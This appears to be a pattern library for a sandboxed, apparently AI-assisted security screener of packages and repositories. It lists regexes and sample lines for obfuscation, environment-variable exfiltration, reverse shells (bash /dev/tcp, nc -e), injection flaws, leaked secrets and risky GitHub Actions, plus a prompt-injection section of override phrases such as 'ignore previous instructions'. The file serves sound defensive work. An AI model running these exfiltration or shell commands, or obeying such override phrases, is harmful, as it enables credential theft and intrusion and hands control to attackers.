# Detection Heuristics

Pattern library for sandboxed security screening. Organized by threat priority.

## Contents

1. [Malicious Code](#malicious-code) - Direct threat on install
2. [Dynamic Analysis](#dynamic-analysis) - Runtime behavior indicators
3. [Supply Chain](#supply-chain) - Indirect threat via dependencies
4. [GitHub Actions](#github-actions) - Threat if you fork/contribute
5. [Injection Vulnerabilities](#injection-vulnerabilities) - Code quality issues
6. [Prompt Injection](#prompt-injection) - Attacks on the screener itself
7. [Secrets](#secrets) - Hygiene indicator (yellow flag)
8. [License](#license) - Legal, not security

---

## Malicious Code

### Obfuscation Indicators

**JavaScript:**
```
eval\s*\(
Function\s*\(
atob\s*\(
String\.fromCharCode
\\x[0-9a-fA-F]{2}
\\u[0-9a-fA-F]{4}
```

**Python:**
```
exec\s*\(
eval\s*\(
compile\s*\(
__import__\s*\(
```

**Heavy obfuscation signals:**
- Long strings of hex/unicode escapes
- Variable names: `_0x`, `O0O0O`, `_$_`, `__$`
- Minified code in source (not build output)
- Base64 strings > 100 chars

### Data Exfiltration

**Environment variable theft:**
```javascript
fetch('https://...', { body: JSON.stringify(process.env) })
https.request({...}).end(JSON.stringify(process.env))
```

```python
requests.post('https://...', json=dict(os.environ))
```

**Postinstall exfil:**
```json
"postinstall": "node setup.js"
```
Then setup.js contains network calls with system info.

### Backdoors

**Reverse shells:**
```
socket.*connect.*exec
bash -i >& /dev/tcp
nc -e /bin/
python -c.*socket.*subprocess
```

**Hidden endpoints:**
```
/debug/
/backdoor/
/admin-secret/
/__hidden__/
```

---

## Dynamic Analysis

**New in v4.0.0** - Behavioral indicators observed during actual execution.

### Process Monitoring

Run before and after `npm install` / `pip install`:

```bash
ps aux > /tmp/before.txt
npm install 2>&1 | tee /tmp/install.log
ps aux > /tmp/after.txt
diff /tmp/before.txt /tmp/after.txt
```

**Red flags in process diff:**

| Pattern | Severity | Meaning |
|---------|----------|---------|
| New `node` process still running | HIGH | Background task / persistence |
| `curl`, `wget` spawned | HIGH | Downloading payloads |
| `nc`, `netcat` | CRITICAL | Reverse shell attempt |
| `python -c` | HIGH | Inline script execution |
| Crypto-related process names | HIGH | Crypto miner |

### Network Activity

**During install, watch for:**

```bash
# In install log
grep -E "(curl|wget|nc|POST|GET|http|https)" /tmp/install.log
```

| Pattern | Severity | Meaning |
|---------|----------|---------|
| `curl` to non-npm/pypi domain | HIGH | Payload download |
| `POST` to unknown host | CRITICAL | Data exfiltration |
| Webhook URLs (webhook.site, etc.) | CRITICAL | Exfil endpoint |
| Discord/Telegram webhook | HIGH | Common exfil channels |

### File System Changes

```bash
# Files created outside project during install
find /tmp -newer /tmp/before.txt -type f 2>/dev/null
find ~ -newer /tmp/before.txt -type f 2>/dev/null
find /etc -newer /tmp/before.txt -type f 2>/dev/null
```

**Red flags:**

| Location | Severity | Meaning |
|----------|----------|---------|
| `~/.ssh/` | CRITICAL | SSH key theft/modification |
| `~/.aws/`, `~/.config/` | CRITICAL | Credential access |
| `/tmp/` with executable | HIGH | Staged payload |
| `~/.bashrc`, `~/.profile` | CRITICAL | Persistence |
| Cron directories | CRITICAL | Scheduled persistence |

### Install Log Analysis

```bash
cat /tmp/install.log | grep -iE "(error|warning|permission|denied|secret|token|key|password)"
```

**Suspicious patterns:**
- Errors about missing permissions (trying to access protected files)
- References to credential files
- Base64 encoded strings in output
- URLs to non-standard domains

---

## Supply Chain

### Typosquatting Detection

| Attack | Example |
|--------|---------|
| Single char substitution | `lodash` → `lodahs` |
| Transposition | `lodash` → `lodasj` |
| Missing char | `lodash` → `lodsh` |
| Extra char | `lodash` → `lodassh` |
| Homoglyph | `lodash` → `l0dash` |

### Suspicious Package Signals

**Red flags:**
- Published < 30 days ago
- < 100 weekly downloads
- Single maintainer with no other packages
- No GitHub link or mismatched link
- Postinstall scripts with network calls
- Name similar to popular package

### Lockfile Integrity

Check for:
- Integrity hash changes without version changes
- Non-official registry URLs
- Lockfile/manifest mismatch

### Deep Investigation Triggers

**Automatically investigate a dependency when ANY of:**

| Trigger | How to Check |
|---------|--------------|
| Typosquatting candidate | Levenshtein distance ≤ 2 from popular package |
| Low downloads | `npm view <pkg> | grep weekly` < 1000 |
| New package | `npm view <pkg> time.created` < 90 days ago |
| No source link | `npm view <pkg> repository` is empty |
| Has install scripts | `npm view <pkg> scripts.postinstall` exists |
| Single maintainer | `npm view <pkg> maintainers` has 1 entry |

**For Python:**
```bash
# Check package info
pip index versions <pkg>  # See if it exists
pip show <pkg>  # After install, check metadata
```

**npm quick check command:**
```bash
npm view <suspicious-pkg> --json | jq '{
  name: .name,
  version: .version,
  created: .time.created,
  downloads: "check npmjs.com",
  repository: .repository,
  scripts: .scripts,
  maintainers: .maintainers
}'
```

### Slopsquatting (AI-Hallucinated Packages)

**2025+ attack vector.** LLMs hallucinate fake package names that attackers register.

**Detection signals:**
- Package exists but has < 10 downloads total
- Package created very recently with name similar to AI-suggested patterns
- Package description mentions "AI", "GPT", "LLM" but has minimal code
- README is auto-generated or suspiciously generic

**High-risk patterns:**
- Names that sound plausible but don't match established packages
- Packages with names like `gpt-utils`, `llm-helper`, `ai-toolkit` (common hallucinations)

**Reference:** 21.7% of open-source LLM package suggestions are hallucinated ([Socket.dev research](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks))

---

## GitHub Actions

### Dangerous Triggers

```yaml
on:
  pull_request_target:  # Runs with write access on fork PRs
  issue_comment:        # Anyone can comment
  workflow_run:         # Check what triggers it
```

### Script Injection

**UNSAFE - user input in run:**
```yaml
run: echo "${{ github.event.issue.body }}"
run: |
  echo "${{ github.event.pull_request.title }}"
```

**SAFE - use environment variable:**
```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: echo "$TITLE"
```

### Overly Permissive

```yaml
permissions:
  contents: write
  pull-requests: write
  issues: write
```

Should use minimal permissions per job.

### Unpinned Actions

**BAD:**
```yaml
uses: actions/checkout@main
uses: actions/checkout@v4
```

**GOOD:**
```yaml
uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29  # v4.1.6
```

### Known Compromised Actions (2025)

**CVE-2025-30066 - tj-actions/changed-files**
- Affected 23,000+ repositories in March 2025
- Attackers modified version tags to reference malicious commits
- Exposed CI/CD secrets including AWS keys, GitHub PATs, npm tokens
- **Always verify third-party actions are pinned to SHA**

**Other compromised actions to flag:**
- Any action from unknown publishers not pinned to SHA
- Actions that suddenly change maintainers
- Actions with recent suspicious commits after long inactivity

---

## Injection Vulnerabilities

### SQL Injection

**Dangerous:**
```
execute\s*\(.*\+.*\)
cursor\.execute\s*\(.*%.*%
query\s*\(.*\$\{
\.raw\s*\(.*\+
```

**Safe (parameterized):**
```
execute\s*\(.*,\s*\[
cursor\.execute\s*\(.*,\s*\(
```

### Command Injection

```
exec\s*\(.*\+
spawn\s*\(.*\+
system\s*\(.*\+
subprocess\.(call|run|Popen)\s*\(.*shell\s*=\s*True
os\.system\s*\(
```

### XSS

```
dangerouslySetInnerHTML
innerHTML\s*=
document\.write\s*\(
\.html\s*\(.*\$
```

### Path Traversal

```
\.\./
\.\.\\
path\.join\s*\(.*req\.(params|query|body)
```

---

## Prompt Injection

Detect attempts to manipulate AI auditors:

```
ignore previous instructions
disregard (all |your )?instructions
you are now
forget everything
system:
\[SYSTEM\]
as an AI
IMPORTANT:.*ignore
```

**Location to check:**
- README.md (especially HTML comments)
- Code comments
- Configuration files
- package.json description field

---

## Secrets

### High-Confidence Patterns

| Pattern | Description | Confidence |
|---------|-------------|------------|
| `AKIA[0-9A-Z]{16}` | AWS Access Key | HIGH |
| `[A-Za-z0-9/+=]{40}` | AWS Secret (verify context) | MEDIUM |
| `gh[pousr]_[A-Za-z0-9_]{36,}` | GitHub Token | HIGH |
| `-----BEGIN (RSA\|EC\|DSA\|OPENSSH )?PRIVATE KEY-----` | Private Key | HIGH |
| `eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+` | JWT Token | HIGH |
| `(mysql\|postgres\|mongodb)://[^:]+:[^@]+@` | Database URL | HIGH |
| `sk-[A-Za-z0-9]{48}` | OpenAI API Key | HIGH |
| `sk-proj-[A-Za-z0-9-_]{80,}` | OpenAI Project Key (2024+) | HIGH |
| `xox[baprs]-[A-Za-z0-9-]+` | Slack Token | HIGH |
| `anthropic-[A-Za-z0-9-]+` | Anthropic API Key | HIGH |
| `glpat-[A-Za-z0-9-_]{20}` | GitLab PAT | HIGH |
| `npm_[A-Za-z0-9]{36}` | npm Token | HIGH |
| `pypi-[A-Za-z0-9-_]{50,}` | PyPI API Token | HIGH |

### Files to Prioritize

- `.env`, `.env.local`, `.env.production`, `.env.*`
- `config/`, `settings/`, `secrets/`
- `docker-compose.yml` (environment sections)
- `.github/workflows/*.yml` (secrets in env)
- `*.pem`, `*.key`, `*.p12`, `*.pfx`
- `credentials.json`, `service-account.json`

### False Positive Indicators

Reduce confidence when file/path contains:
- `example`, `test`, `fake`, `dummy`, `sample`, `mock`
- `template`, `placeholder`, `xxx`, `your-`

### Generic High-Entropy Secrets

**40% of real leaks are generic secrets** that don't match specific patterns.

**Detection approach:**
Look for high-entropy strings (random-looking) assigned to sensitive variables:

```
(password|passwd|pwd|secret|token|key|auth|credential|api_key)\s*[=:]\s*['"][A-Za-z0-9+/=]{16,}['"]
```

**High-entropy indicators:**
- String length > 20 characters
- Mix of uppercase, lowercase, numbers
- No dictionary words
- Assigned to variables with sensitive names

**Context matters:**
- `API_KEY = "abc123"` → LOW confidence (too short, simple)
- `API_KEY = "aK9x2mPqR7vN5wL8"` → MEDIUM confidence
- `API_KEY = "key_live_EXAMPLE_NOT_REAL_1234567890"` → HIGH confidence

---

## License

### Copyleft (Viral)

| License | Impact |
|---------|--------|
| GPL-2.0, GPL-3.0 | Must open-source derivative works |
| AGPL-3.0 | Even for SaaS usage |
| LGPL | For static linking |

### No License

Code without license = all rights reserved. Cannot legally use.

### Detection

Check:
- `LICENSE`, `LICENSE.md`, `LICENSE.txt`
- `package.json` license field
- File headers with SPDX identifiers

---

## Severity Quick Reference

| Finding | Default Severity |
|---------|------------------|
| Hardcoded secret (active) | CRITICAL |
| Malicious code / backdoor | CRITICAL |
| Credential file access during install | CRITICAL |
| Reverse shell indicators | CRITICAL |
| SQL/command injection | HIGH |
| Typosquatting dependency | HIGH |
| Network exfil during install | HIGH |
| Vulnerable dependency (CVE) | HIGH |
| GitHub Actions script injection | HIGH |
| Background process after install | HIGH |
| XSS | MEDIUM-HIGH |
| Outdated dependency | MEDIUM |
| Missing/incompatible license | MEDIUM |
| Prompt injection attempt | MEDIUM |
| Files created outside project | MEDIUM |

---

## Tool-Specific Patterns

### Trivy Output

```bash
trivy fs . --scanners vuln,secret,misconfig,license --format table
```

**Look for:**
- CRITICAL/HIGH CVEs
- Secrets detected
- Misconfigurations in Dockerfiles, K8s manifests

### Gitleaks Output

```bash
gitleaks detect -v --no-git
```

**Look for:**
- Verified secrets (high confidence)
- Secrets in git history (`gitleaks detect -v`)

### actionlint + zizmor

```bash
actionlint .github/workflows/*.yml
zizmor .github/workflows/
```

**Look for:**
- Script injection warnings
- Unpinned action refs
- Dangerous triggers (pull_request_target)
